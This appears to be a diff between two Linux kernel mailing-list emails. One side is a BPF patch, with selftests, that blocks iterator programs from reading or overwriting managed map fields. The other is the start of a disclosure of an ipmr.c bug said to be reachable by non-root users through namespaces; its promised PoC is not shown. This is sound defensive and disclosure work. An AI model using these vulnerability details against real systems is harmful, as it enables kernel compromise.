@@ -1,118 +1,96 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.173
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.169
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1792478150;
-	b=czWZk+uihAKzz//DUFPBHDOhg5z6apw+kBjBQRJG1tYSG6qwO64bfaxAA/ewweTObxwR
-	 8+OWICGqXxie3axIYfd9Dg9J2jvWiEl2YUCjHHDBYWhgcDj4PgZGttd3X4hOTBXh+gzRv
-	 Pj37cFDotfrlVvcrbJdTPezeoj6ONXdpDxM5vsPsRpTngCCHFarT7RMK6YwgTekLQmMot
-	 9P6dWt0u44YgvbodSB14mrJChiVq/bcZfbijFk/3+SiqKKN1z1HtqkxrHVYQSVhNvZZ+b
-	 tzygTMrhf1ostSUYELWoXjU47G0yKtbc4hG0BWVS+xkDDL6HQipmEAbaSelmyoIeXmw==
+	t=1792478389;
+	b=zUb/PZc6t3JXVwc5Q3WN5i8KkNZFMY11JLzK6+iRPwpGg4YZ/uhT9dyXByT/6EDSCw19
+	 7fomPsy90jGGanWFJcAKkbVbI3ZaKtkYFhNkFnP3I5YL3kNT1chLgVtNyI/IbOFIzAzMW
+	 wEcKDJ0GbDW99tQprUvnPBwNxNo4Fq7j2N8VylT1QoGpHyYgvn7tbut5LztxESn/Z23QZ
+	 XYwT+qWmIa2LsVwiptQ2SKwZYEdHnr5ubngGA/p6ZH7mrNi1mZcdKvKdgNRtv8G/GOaDP
+	 +f6YdUtNC8Mjjogz8JNEQcijg0nt5wTxpAD6izEqQlSnd/iaRFJY11GYjCf2xP7QdFA==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1792478150;
+	a=rsa-sha256; c=relaxed/relaxed; t=1792478389;
 	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
 	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
-	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:In-Reply-To:References:
-	 MIME-Version:Content-Transfer-Encoding;
-	bh=6V94UZGcvxRhySlpmKr6KDy7Ay7ek5MflZMdTT+83LI=;
-	b=dpYPkU0WmOKfJQKX0HzG8awAwJudCA3Tb73+vDKTF18TeJJrGG2o1NscWpd2UAoyBp0r
-	 BlXrnf6uT2XmxSuoWaEmorwNN+X+f8Ytu/t0441HUuQXuhH9B9G5MVUwhFTsf0lOSGLds
-	 hlUHsC/Konzgu+dFiqtNiOKwfiMxS+S9Pv3PNs9+uGLjeojQFd5lV1swLh5xWCDk+QInq
-	 eOaAk3glu5j5PLL1U8HdHt4VlsWHGrkM+dMmsNBFAHP+1igOHcG/jnNgIX8Hj8ZQwKZ1h
-	 WNOsPHjfPows4fl467oeE4NUsWkHPcTBUdY9bVvEZw5VNCcOhIBV/N7QbWIWz6z4PbA==
+	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
+	 Content-Transfer-Encoding;
+	bh=Mm2eIWeYDvq6rkIdkycz7a/9VHZDL94tQ0sAVGq3By4=;
+	b=4FWqxN1p6oC7xCT73/xODmh86mPuiQv5tmo8Y5iOlVjICJSf4BQ2CKIOgncSI/qh5u49
+	 NAPIqwDQttHqFZIc5fY+yL7MJ/Iid11YDQOSM0M9nm8arn6dwm3b834Ay0G6M0DAP/8BR
+	 qUcG7d8fhQwDMyx90XodcSK4IDc/5JlC4zGATrqGRXEloBfwmgdbwr4vSAeoWekS7qNlp
+	 jFWMpROOmCMFLlWYdT+F5drd3aV9/YcT8a68SQdH4KK2Z8qCSagWYEH7luLEpbHH+gPFN
+	 LYEK/9VvEYl1EI3Y+Rwv51zwT4xxVC0m3uhy4z1J7kHi4c3bgMtw36JB0/qN/YL5BTw==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=nebusec.ai;
 	spf=pass smtp.mailfrom=nebusec.ai;
-	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=M8ZfGt7X;
-	arc=none smtp.remote-ip=74.125.82.173
-Received: from mail-dy1-f173.google.com (mail-dy1-f173.google.com [74.125.82.173])
+	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=BHgAnYZ6;
+	arc=none smtp.remote-ip=74.125.82.169
+Received: from mail-dy1-f169.google.com (mail-dy1-f169.google.com [74.125.82.169])
 	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3322A606A31C
-	for <netdev@vger.kernel.org>; Tue, 20 Oct 2026 06:35:49 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 3322A606A31C
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 43BD0606A319
+	for <netdev@vger.kernel.org>; Tue, 20 Oct 2026 06:39:49 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 43BD0606A319
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=M8ZfGt7X
-Received: by mail-dy1-f173.google.com with SMTP id 5a478bee46e88-35ef6b49813so5430992eec.0
-        for <netdev@vger.kernel.org>; Mon, 19 Oct 2026 23:35:49 -0700 (PDT)
+	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=BHgAnYZ6
+Received: by mail-dy1-f169.google.com with SMTP id 5a478bee46e88-35ef6b49813so5435508eec.0
+        for <netdev@vger.kernel.org>; Mon, 19 Oct 2026 23:39:49 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1792478148; x=1793082948; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=6V94UZGcvxRhySlpmKr6KDy7Ay7ek5MflZMdTT+83LI=;
-        b=M8ZfGt7XzBgHjfaJjwg7A7651d8XtZPHnbuPrdDQ6Vpc5oBpPkXXp23KwHIgNS7RtU
-         I2l9pBYtEZuVii0szh0QhGBiNZmuKS43BFUbbbqZmU2DRZ6e5ZKqXYa4Goomn0FB8OBm
-         4otDrAqAG2L3Hoz+heERyfgwI87tPJUox9ov1MzUeSLrtizkr8G0Qx/YEuA3hj9OR7tl
-         +gqbDy+2clEWkRC/n+0PhqLqabsBv6rf07W7dx4/WOEXIpJJ/F6+60+iKV/nYQ6jjh8e
-         wjJITOAN2ENDXLeH1nTin9dr5z7T3L4Msla802QCOPayXaxjlsSF1+Vo/V+MLaYCMjcN
-         oUEQ==
+        d=nebusec.ai; s=google; t=1792478388; x=1793083188; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=Mm2eIWeYDvq6rkIdkycz7a/9VHZDL94tQ0sAVGq3By4=;
+        b=BHgAnYZ6iigj1QMm9Ge43qCpfM2lCEx/1XflM5M68EsiYzboOe6vSbiMFEtoOjNuzy
+         0L67X9YR9hrvr9LmprHeiImEq1tKfPBmTMacbMycnQ5RQ1uuVZoDtlgvW97MzznP9+ie
+         KNHPjuAuQxsdjY9IgB6/wkE+V0sHpzonjV8HL7Bldbq9SsQwlOyqx+yMKUo0YgzDWf6r
+         HUwBrFy9J1n+7sHbUEIMPgSVrFC9Ob2huRZjNT7SbQRc3YDq54H84c7SamAUZaAzoRlB
+         lDdWPdzvJTnTa9KZO4vnFp0dK12zOwd9S/57nN4+cDve7fUqFzrCcwnZLP/52cmejWuW
+         sZxg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1792478148; x=1793082948;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to:content-type;
-        bh=6V94UZGcvxRhySlpmKr6KDy7Ay7ek5MflZMdTT+83LI=;
-        b=uyjpa9TD4Bs0ULy9NjfFMP1cjN8MJ7sGSPYjTQ7J56KXB4DHS4OpIfteBLFPxg08mQ
-         HHatgQoktXKu5yIKkSocPepDxTackznQ7to5Rbre2JdC252Co4jbYeNm+DNCueO9z10o
-         3b77rovH0braZyIV9OJqKsPo+xVBZlchoOVYj+lJMDjqyXkATLBkgay9DO7aZ+zRq+7L
-         pClwmB8Y6TeW0XwsoxlWQUiaAHilBWntCwltzxhz36keoo3v5lyHjSocwEjxXr0zOH0i
-         fauabsaZ9H/I1lIeg53rj5bzW7P92nIkwUPOJ9mAWb3w+M5rzlMijMGnNzOwSXrIvDQS
-         0avw==
-X-Forwarded-Encrypted: i=1; AKwUvBxEAhobdQh/iwFGsHY0dukjCfGcLLxq6V6LEcOj/AHCUCUgCRo4KFPuX3KuF4uabRJ7nmphgQ8=@vger.kernel.org
-X-Gm-Message-State: AFq9FYJyZcQuwAmB1INuKNPOoAOQdBqr2yfiFXjVcXRaFygzLCzj8+P7
-	8N/eZzeAvk5nhjmSEg2NQsYk5SvIjM9EFfqbpmVLkZp6a4qx2nwnfMFQY/OUiCamkW1E
-X-Gm-Gg: AYBFou0QVK6rxWjMs4n+J9zHtW7Yf1eZZ01qEkmD4pB/hK0ZgNQ5qJ7mfG/jodxbWCe
-	dmkbJuKltshRy3KM6lale7Nqd9ny9aG5UOnpergDx12L0IdXYIjgAmIISG0OV9f02FK3xw0siRL
-	lbPXuNPyRIlaSB7OJaEpwTiOnwuYF67B+tiEi1fgh/1rarrPFf6G3EAvGMikkpgw9heknP6yltf
-	qCpDeH5C7idwySe31hOl4ytgMapLzWk3YIWqa6najY/CPH40CZ4a6M6/sloKnDkgBvFagZduGKo
-	iTL0iwM+SCzday4f2XDfx78ggxhRWELPBGzuSPzFw/G91UsIdiw3AsQpBmly9bs8oIXy9dym5Ji
-	/Dk98hbE2cFVZPvZeoMjmTrgYkP5Xnu6FIE0ar4PSWVOpGK3noHRpf0SpVULLb7VuGq4Pmx3PJG
-	T1tqeYJ43q2H4zEzfQ6G0umhReCbrBBsBv/kOfNR7Gp/taZHZWcEv4Dw87H7VYtU8LcFPnHJB6
-X-Received: by 2002:a05:7301:2f2e:b0:35b:b3fa:40f7 with SMTP id 5a478bee46e88-361a33234d1mr13222406eec.38.1792478148023;
-        Mon, 19 Oct 2026 23:35:48 -0700 (PDT)
+        d=1e100.net; s=20260707; t=1792478388; x=1793083188;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=Mm2eIWeYDvq6rkIdkycz7a/9VHZDL94tQ0sAVGq3By4=;
+        b=YrKStZOKxyHEaS5TNW5bEsV1mA0gFvqsOk4rNdL+zc50vCWwv9zi5GS6UYHIyAo5hh
+         b9Hqa/sBh8DyuN3yfqGD0yMzTRY2M9OWxTumVrIiqXhjCfhG4p9zuAXru3VoeHxQ8fwg
+         t4mRT656Kl98xdwgB7+N1PnGKe54BgS7oowvUNu9j+1oUBa3SPpYGtsau+hWrvnHuyT3
+         nKYaxyxd1SMsMevtIKn4XsoYTbvApJYLmB6rMwZJy85dENDfgr8Znaw80ZoNHNXark9i
+         Haq+BBsVZpBP8rnzR2EqmLcXUJl2f4omul9Rv+ZmRU4koch695GZ/+ZqWoLO4Ui49U1b
+         d1iQ==
+X-Forwarded-Encrypted: i=1; AKwUvBwyAJCrPjZJYvd5l/RSqHGcBbW1vVWAUoDa3R/y0EfmssGHNybp9umJ7GszWmf5C4ew+ZjEs90=@vger.kernel.org
+X-Gm-Message-State: AFq9FYJGqHdR+WhczT/hw6pSpf/OfnHq+8tyY4E1on4+hy3cmt0952tE
+	khJoUjSMjTcr9e/LANSuHu9oaXcyxc/Htv6YjP+VBiOnCsttMizubtqyPxJsaSZRq8Uf
+X-Gm-Gg: AYBFou0evDgwevgN2nJeMnJUSFU3AnQRrvLW5tXArFA9AxMk27J8NTjJO3RAsbck8ye
+	B58pileqUEhn/uP1wg0XQcE8RegapRO9OMKGEs233OiQ7oEjRxzDcLSrhIxHn6Pf82UUqZp97UM
+	Db4BmnUfewRoxMdNxML8038diyJpwxOS2yyi9AonZNjqUBGdp7EJ6TtgJCvpGDacG86poJOwVy7
+	7IFuBWXCJDDqKyQHehq/kTjbNaH9X+6AiJtInKIDMbqjQqUJyEpAvkTV4QqFgt3+n04X7SRW19o
+	vtF1i6oo9SC01S+wJtACqT9MFWQFZtOKXNuEC6cD7/PJOrv/ziFLiGXP/xdD9S0qImm1z0cr4oy
+	ZZD3lavMb3tE6IwJJSFuXe9B0n6HeavZDUenYcHuSe44QpzGz/8C3Wv80jrZRrfJUQ2KetC/cJX
+	OVXt1m/fRd4XtTpEmg63k98st+SSIHzDgIeV53STfDM/bTEyp/VDCjs9lyNdofCTqYZmHVgjTnZ
+	1HwjdFfLDa876/U37pTwXP1
+X-Received: by 2002:a05:693c:20c5:20b0:35c:2986:35ab with SMTP id 5a478bee46e88-361a1668b4dmr14284307eec.13.1792478388009;
+        Mon, 19 Oct 2026 23:39:48 -0700 (PDT)
 Received: from Roxy.sysu.edu.cn ([203.175.14.54])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-36632d8b273sm2618192eec.15.2026.10.19.23.35.41
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-36081bafa7asm37435014eec.14.2026.10.19.23.39.44
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Mon, 19 Oct 2026 23:35:47 -0700 (PDT)
+        Mon, 19 Oct 2026 23:39:47 -0700 (PDT)
 From: Zhiling Zou <zhilinz@nebusec.ai>
-To: ameryhung@gmail.com,
-	bpf@vger.kernel.org,
-	netdev@vger.kernel.org,
-	llvm@lists.linux.dev
-Cc: ast@kernel.org,
-	daniel@iogearbox.net,
-	andrii@kernel.org,
-	eddyz87@gmail.com,
-	memxor@gmail.com,
-	martin.lau@linux.dev,
-	song@kernel.org,
-	yonghong.song@linux.dev,
-	jolsa@kernel.org,
-	emil@etsalapatis.com,
-	ihor.solodrai@linux.dev,
-	john.fastabend@gmail.com,
+To: idosch@nvidia.com,
+	edumazet@google.com,
+	netdev@vger.kernel.org
+Cc: dsahern@kernel.org,
 	davem@davemloft.net,
-	edumazet@kernel.org,
 	pabeni@redhat.com,
 	horms@kernel.org,
-	nathan@kernel.org,
-	ndesaulniers@google.com,
-	morbo@google.com,
-	justinstitt@google.com,
-	zhilinz@nebusec.ai,
-	menglong8.dong@gmail.com,
-	bestswngs@gmail.com,
-	mattbobrowski@google.com,
+	leone4fernando@gmail.com,
 	vega@nebusec.ai,
-	sashiko-bot@kernel.org
-Subject: [PATCH bpf v2 1/1] bpf: reject raw iteration over managed map fields
-Date: Tue, 20 Oct 2026 14:35:24 +0800
-Message-ID: <96a6b5dcf721e49c049662cc269d8ac8c389b6af.1792217106.git.zhilinz@nebusec.ai>
+	zhilinz@nebusec.ai
+Subject: [PATCH net v6 0/1] ipmr: only copy pktinfo to cache reports
+Date: Tue, 20 Oct 2026 14:39:35 +0800
+Message-ID: <cover.1792476357.git.zhilinz@nebusec.ai>
 X-Mailer: git-send-email 2.55.0
-In-Reply-To: <cover.1792217106.git.zhilinz@nebusec.ai>
-References: <cover.1792217106.git.zhilinz@nebusec.ai>
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -124,589 +102,360 @@ Precedence: list
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-BPF map iterators expose values as writable PTR_TO_BUF memory. Attach-time
-validation bounds maximum access by value_size, but does not account for
-BTF-managed fields in map values. Direct buffer accesses can therefore read
-or overwrite fields such as __kptr without the verifier's ownership checks.
+Hi Linux kernel maintainers,
 
-For bpf_map_elem and bpf_sk_storage_map iterators, limit value access to
-the prefix before the first managed field. Since max_rdwr_access is an
-exclusive end offset and record fields are sorted, accesses ending at the
-first managed field remain available while accesses reaching it are denied.
+We found and validated an issue in net/ipv4/ipmr.c. The bug is reachable
+by a non-root user via user and net namespaces with namespace-local
+CAP_NET_ADMIN and CAP_NET_RAW.
 
-Revalidate the replacement program against the map associated with an
-iterator link before bpf_link_update() swaps programs. Add selftests for
-allowed prefix access, rejected managed-field reads and writes, and link
-updates that introduce managed-field access.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Fixes: 9db44fdd8105 ("bpf: Support kptrs in local storage maps")
-Cc: stable@vger.kernel.org
-Reported-by: Vega <vega@nebusec.ai>
-Link: https://lore.kernel.org/all/1fa798d444efac579e91ee0716e228902a8f9afe.1791980149.git.zhilinz@nebusec.ai/
-Reported-by: Sashiko <sashiko-bot@kernel.org>
-Closes: https://sashiko.dev/#/patchset/cover.1791980149.git.zhilinz@nebusec.ai?part=1
-Suggested-by: Amery Hung <ameryhung@gmail.com>
-Assisted-by: LLM
-Signed-off-by: Zhiling Zou <zhilinz@nebusec.ai>
----
-changes in v2:
-- Cover bpf_map_elem in addition to bpf_sk_storage_map iterators.
-- Allow access to ordinary value fields before the first managed field.
-- Revalidate replacement programs against the attached map on
-  bpf_link_update().
-- Add selftests for allowed prefix access, rejected kptr reads/writes, and
-  replacement-program validation for both iterator targets.
-- Address the Sashiko link-update finding and Amery Hung's review comments.
-- v1 Link: https://lore.kernel.org/all/1fa798d444efac579e91ee0716e228902a8f9afe.1791980149.git.zhilinz@nebusec.ai/
+---- details below ----
 
- include/linux/bpf.h                           |   3 +
- kernel/bpf/bpf_iter.c                         |   9 +
- kernel/bpf/map_iter.c                         |  56 ++++--
- net/core/bpf_sk_storage.c                     |  34 +++-
- .../selftests/bpf/prog_tests/bpf_iter.c       | 187 ++++++++++++++++++
- .../bpf/progs/bpf_iter_bpf_sk_storage_map.c   | 113 +++++++++++
- 6 files changed, 377 insertions(+), 25 deletions(-)
+Bug details:
 
-diff --git a/include/linux/bpf.h b/include/linux/bpf.h
-index 0ecb9418dfbd6..b6864779096df 100644
---- a/include/linux/bpf.h
-+++ b/include/linux/bpf.h
-@@ -3007,6 +3007,8 @@ struct bpf_iter_aux_info {
- typedef int (*bpf_iter_attach_target_t)(struct bpf_prog *prog,
- 					union bpf_iter_link_info *linfo,
- 					struct bpf_iter_aux_info *aux);
-+typedef int (*bpf_iter_validate_prog_t)(struct bpf_prog *prog,
-+					const struct bpf_iter_aux_info *aux);
- typedef void (*bpf_iter_detach_target_t)(struct bpf_iter_aux_info *aux);
- typedef void (*bpf_iter_show_fdinfo_t) (const struct bpf_iter_aux_info *aux,
- 					struct seq_file *seq);
-@@ -3024,6 +3026,7 @@ enum bpf_iter_feature {
- struct bpf_iter_reg {
- 	const char *target;
- 	bpf_iter_attach_target_t attach_target;
-+	bpf_iter_validate_prog_t validate_prog;
- 	bpf_iter_detach_target_t detach_target;
- 	bpf_iter_show_fdinfo_t show_fdinfo;
- 	bpf_iter_fill_link_info_t fill_link_info;
-diff --git a/kernel/bpf/bpf_iter.c b/kernel/bpf/bpf_iter.c
-index b40eb404adab9..765148de64d65 100644
---- a/kernel/bpf/bpf_iter.c
-+++ b/kernel/bpf/bpf_iter.c
-@@ -409,6 +409,8 @@ static int bpf_iter_link_replace(struct bpf_link *link,
- 				 struct bpf_prog *new_prog,
- 				 struct bpf_prog *old_prog)
- {
-+	struct bpf_iter_link *iter_link =
-+		container_of(link, struct bpf_iter_link, link);
- 	int ret = 0;
- 
- 	mutex_lock(&link_mutex);
-@@ -424,6 +426,13 @@ static int bpf_iter_link_replace(struct bpf_link *link,
- 		goto out_unlock;
- 	}
- 
-+	if (iter_link->tinfo->reg_info->validate_prog) {
-+		ret = iter_link->tinfo->reg_info->validate_prog(new_prog,
-+								 &iter_link->aux);
-+		if (ret)
-+			goto out_unlock;
-+	}
-+
- 	old_prog = xchg(&link->prog, new_prog);
- 	bpf_prog_put(old_prog);
- 
-diff --git a/kernel/bpf/map_iter.c b/kernel/bpf/map_iter.c
-index c19b360bad9ea..04cf255587aa8 100644
---- a/kernel/bpf/map_iter.c
-+++ b/kernel/bpf/map_iter.c
-@@ -97,25 +97,15 @@ static struct bpf_iter_reg bpf_map_reg_info = {
- 	.seq_info		= &bpf_map_seq_info,
- };
- 
--static int bpf_iter_attach_map(struct bpf_prog *prog,
--			       union bpf_iter_link_info *linfo,
--			       struct bpf_iter_aux_info *aux)
-+static int bpf_iter_map_elem_check_prog(struct bpf_prog *prog,
-+					struct bpf_map *map)
- {
- 	u32 key_acc_size, value_acc_size, key_size, value_size;
--	struct bpf_map *map;
- 	bool is_percpu = false;
- 	int err = -EINVAL;
- 
--	if (!linfo->map.map_fd)
--		return -EBADF;
--
--	map = bpf_map_get_with_uref(linfo->map.map_fd);
--	if (IS_ERR(map))
--		return PTR_ERR(map);
--	if (map->excl_prog_sha) {
--		err = -EPERM;
--		goto put_map;
--	}
-+	if (map->excl_prog_sha)
-+		return -EPERM;
- 
- 	if (map->map_type == BPF_MAP_TYPE_PERCPU_HASH ||
- 	    map->map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||
-@@ -125,7 +115,7 @@ static int bpf_iter_attach_map(struct bpf_prog *prog,
- 		 map->map_type != BPF_MAP_TYPE_LRU_HASH &&
- 		 map->map_type != BPF_MAP_TYPE_ARRAY &&
- 		 map->map_type != BPF_MAP_TYPE_RHASH)
--		goto put_map;
-+		return err;
- 
- 	key_acc_size = prog->aux->max_rdonly_access;
- 	value_acc_size = prog->aux->max_rdwr_access;
-@@ -135,10 +125,39 @@ static int bpf_iter_attach_map(struct bpf_prog *prog,
- 	else
- 		value_size = round_up(map->value_size, 8) * num_possible_cpus();
- 
--	if (key_acc_size > key_size || value_acc_size > value_size) {
--		err = -EACCES;
-+	if (key_acc_size > key_size || value_acc_size > value_size)
-+		return -EACCES;
-+
-+	/* Fields are sorted by offset; max_rdwr_access is an exclusive end. */
-+	if (map->record && value_acc_size > map->record->fields[0].offset)
-+		return -EACCES;
-+
-+	return 0;
-+}
-+
-+static int bpf_iter_map_elem_validate_prog(struct bpf_prog *prog,
-+					   const struct bpf_iter_aux_info *aux)
-+{
-+	return bpf_iter_map_elem_check_prog(prog, aux->map);
-+}
-+
-+static int bpf_iter_attach_map(struct bpf_prog *prog,
-+			       union bpf_iter_link_info *linfo,
-+			       struct bpf_iter_aux_info *aux)
-+{
-+	struct bpf_map *map;
-+	int err;
-+
-+	if (!linfo->map.map_fd)
-+		return -EBADF;
-+
-+	map = bpf_map_get_with_uref(linfo->map.map_fd);
-+	if (IS_ERR(map))
-+		return PTR_ERR(map);
-+
-+	err = bpf_iter_map_elem_check_prog(prog, map);
-+	if (err)
- 		goto put_map;
--	}
- 
- 	aux->map = map;
- 	return 0;
-@@ -172,6 +191,7 @@ DEFINE_BPF_ITER_FUNC(bpf_map_elem, struct bpf_iter_meta *meta,
- static const struct bpf_iter_reg bpf_map_elem_reg_info = {
- 	.target			= "bpf_map_elem",
- 	.attach_target		= bpf_iter_attach_map,
-+	.validate_prog		= bpf_iter_map_elem_validate_prog,
- 	.detach_target		= bpf_iter_detach_map,
- 	.show_fdinfo		= bpf_iter_map_show_fdinfo,
- 	.fill_link_info		= bpf_iter_map_fill_link_info,
-diff --git a/net/core/bpf_sk_storage.c b/net/core/bpf_sk_storage.c
-index 1d295a8769fad..ffbcfab9a71c3 100644
---- a/net/core/bpf_sk_storage.c
-+++ b/net/core/bpf_sk_storage.c
-@@ -846,12 +846,35 @@ static void bpf_iter_fini_sk_storage_map(void *priv_data)
- 	bpf_map_put_with_uref(seq_info->map);
- }
- 
-+static int bpf_iter_sk_storage_map_check_prog(struct bpf_prog *prog,
-+					      struct bpf_map *map)
-+{
-+	if (map->map_type != BPF_MAP_TYPE_SK_STORAGE)
-+		return -EINVAL;
-+
-+	if (prog->aux->max_rdwr_access > map->value_size)
-+		return -EACCES;
-+
-+	/* Fields are sorted by offset; max_rdwr_access is an exclusive end. */
-+	if (map->record &&
-+	    prog->aux->max_rdwr_access > map->record->fields[0].offset)
-+		return -EACCES;
-+
-+	return 0;
-+}
-+
-+static int bpf_iter_sk_storage_map_validate_prog(struct bpf_prog *prog,
-+						 const struct bpf_iter_aux_info *aux)
-+{
-+	return bpf_iter_sk_storage_map_check_prog(prog, aux->map);
-+}
-+
- static int bpf_iter_attach_map(struct bpf_prog *prog,
- 			       union bpf_iter_link_info *linfo,
- 			       struct bpf_iter_aux_info *aux)
- {
- 	struct bpf_map *map;
--	int err = -EINVAL;
-+	int err;
- 
- 	if (!linfo->map.map_fd)
- 		return -EBADF;
-@@ -860,13 +883,9 @@ static int bpf_iter_attach_map(struct bpf_prog *prog,
- 	if (IS_ERR(map))
- 		return PTR_ERR(map);
- 
--	if (map->map_type != BPF_MAP_TYPE_SK_STORAGE)
--		goto put_map;
--
--	if (prog->aux->max_rdwr_access > map->value_size) {
--		err = -EACCES;
-+	err = bpf_iter_sk_storage_map_check_prog(prog, map);
-+	if (err)
- 		goto put_map;
--	}
- 
- 	aux->map = map;
- 	return 0;
-@@ -898,6 +917,7 @@ static const struct bpf_iter_seq_info iter_seq_info = {
- static struct bpf_iter_reg bpf_sk_storage_map_reg_info = {
- 	.target			= "bpf_sk_storage_map",
- 	.attach_target		= bpf_iter_attach_map,
-+	.validate_prog		= bpf_iter_sk_storage_map_validate_prog,
- 	.detach_target		= bpf_iter_detach_map,
- 	.show_fdinfo		= bpf_iter_map_show_fdinfo,
- 	.fill_link_info		= bpf_iter_map_fill_link_info,
-diff --git a/tools/testing/selftests/bpf/prog_tests/bpf_iter.c b/tools/testing/selftests/bpf/prog_tests/bpf_iter.c
-index c69080ca14f5a..ef12fd0a2ac1c 100644
---- a/tools/testing/selftests/bpf/prog_tests/bpf_iter.c
-+++ b/tools/testing/selftests/bpf/prog_tests/bpf_iter.c
-@@ -1400,6 +1400,191 @@ static void test_bpf_sk_storage_map(void)
- 	bpf_iter_bpf_sk_storage_map__destroy(skel);
- }
- 
-+struct managed_value {
-+	__u64 prefix;
-+	__u64 ptr;
-+};
-+
-+static struct bpf_link *attach_managed_map_iter(struct bpf_program *prog,
-+						int map_fd)
-+{
-+	DECLARE_LIBBPF_OPTS(bpf_iter_attach_opts, opts);
-+	union bpf_iter_link_info linfo = {};
-+
-+	linfo.map.map_fd = map_fd;
-+	opts.link_info = &linfo;
-+	opts.link_info_len = sizeof(linfo);
-+	return bpf_program__attach_iter(prog, &opts);
-+}
-+
-+static int read_managed_map_iter(struct bpf_link *link)
-+{
-+	char buf[64];
-+	int iter_fd, len, err = 0;
-+
-+	iter_fd = bpf_iter_create(bpf_link__fd(link));
-+	if (iter_fd < 0)
-+		return -errno;
-+
-+	while ((len = read(iter_fd, buf, sizeof(buf))) > 0)
-+		;
-+	if (len < 0)
-+		err = -errno;
-+	close(iter_fd);
-+	return err;
-+}
-+
-+static void test_managed_map_elem_iter(struct bpf_iter_bpf_sk_storage_map *skel)
-+{
-+	struct managed_value value = { .prefix = 10 };
-+	__u32 key = 1;
-+	int map_fd, err;
-+	struct bpf_link *link;
-+
-+	map_fd = bpf_map__fd(skel->maps.managed_hash_map);
-+	err = bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);
-+	if (!ASSERT_OK(err, "hash_map_update"))
-+		return;
-+
-+	link = attach_managed_map_iter(skel->progs.map_iter_prefix, map_fd);
-+	if (!ASSERT_OK_PTR(link, "hash_prefix_attach"))
-+		return;
-+	err = read_managed_map_iter(link);
-+	bpf_link__destroy(link);
-+	if (!ASSERT_OK(err, "hash_prefix_iter"))
-+		return;
-+
-+	err = bpf_map_lookup_elem(map_fd, &key, &value);
-+	if (!ASSERT_OK(err, "hash_prefix_lookup") ||
-+	    !ASSERT_EQ(value.prefix, 11, "hash_prefix_value"))
-+		return;
-+
-+	link = attach_managed_map_iter(skel->progs.map_iter_no_access, map_fd);
-+	if (!ASSERT_OK_PTR(link, "hash_no_access_attach"))
-+		return;
-+	err = bpf_link__update_program(link, skel->progs.map_iter_write_kptr);
-+	if (!ASSERT_EQ(err, -EACCES, "hash_link_update_kptr"))
-+		goto out;
-+	err = bpf_link__update_program(link, skel->progs.map_iter_prefix);
-+	if (!ASSERT_OK(err, "hash_link_update_prefix"))
-+		goto out;
-+	err = read_managed_map_iter(link);
-+	if (!ASSERT_OK(err, "hash_updated_iter"))
-+		goto out;
-+	err = bpf_map_lookup_elem(map_fd, &key, &value);
-+	if (!ASSERT_OK(err, "hash_updated_lookup") ||
-+	    !ASSERT_EQ(value.prefix, 12, "hash_updated_value"))
-+		goto out;
-+
-+	bpf_link__destroy(link);
-+	link = attach_managed_map_iter(skel->progs.map_iter_read_kptr, map_fd);
-+	err = libbpf_get_error(link);
-+	if (!ASSERT_EQ(err, -EACCES, "hash_read_kptr_attach")) {
-+		if (!err)
-+			bpf_link__destroy(link);
-+		return;
-+	}
-+
